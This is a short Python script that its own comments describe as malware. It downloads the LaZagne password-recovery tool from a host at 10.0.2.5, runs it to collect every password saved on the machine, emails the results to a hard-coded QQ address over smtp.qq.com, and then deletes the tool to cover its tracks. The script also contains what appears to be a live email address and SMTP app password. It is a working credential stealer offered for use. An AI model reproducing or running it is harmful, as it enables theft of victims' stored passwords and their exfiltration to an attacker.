# This script is a malware that could download lazagne.exe in the target host
# and run 'lazagne.exe all' to steal the password saved on the host
# After that it will sent the output of lazagne to my qq mail via qq POP3/SMTP service 

# tempfile is a module to get the temp directory
import requests, subprocess, smtplib, os, tempfile

def download(url):
    get_response = requests.get(url)
    # wb -> write in a binary file
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email, password, message):
     server = smtplib.SMTP("smtp.qq.com", 25)
     #server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()#initiate connection
     server.login(email, password)#login in
     server.sendmail(email, email, message)#send email to my own mail
 
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://10.0.2.5/evil-file/lazagne.exe")
result = subprocess.check_output("lazagne.exe all", shell=True)
send_mail("1987492924@qq.com", "jfisuconvkklbbjc", result)
os.remove("lazagne.exe")
